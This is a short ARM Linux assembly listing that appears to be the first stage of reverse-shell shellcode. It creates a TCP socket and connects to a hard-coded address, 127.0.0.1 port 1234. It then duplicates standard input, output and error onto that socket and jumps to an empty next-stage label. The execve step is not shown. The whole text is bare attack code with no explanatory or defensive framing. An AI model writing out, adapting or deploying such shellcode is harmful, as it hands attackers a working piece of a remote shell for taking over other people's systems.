.section .text
.global _start

_start:
socket:
    mov r0, #2
    mov r1, #1
    mov r2, #0
    mov r7, #255
    add r7, #26
    svc 0
socket_test:
    cmp r0, #0
    blt exit

    mov r4, r0 @save sockfd

connect:
    mov r0, r4
    add r1, pc, #(addr - . - 8)
    mov r2, #16
    mov r7, #255
    add r7, #28
    svc 0
connect_test:
    cmp r0, #0
    bne exit

dup2:
    mov r0, r4
    mov r1, #0
    mov r7, #63
    svc 0

    mov r0, r4
    mov r1, #1
    mov r7, #63
    svc 0

    mov r0, r4
    mov r1, #2
    mov r7, #63
    svc 0

    b next_stage

exit:
    mov r0, #0
    mov r7, #1
    svc 0


addr:
.short 2
params:
.short 0xD204
.byte 127,0,0,1

next_stage:

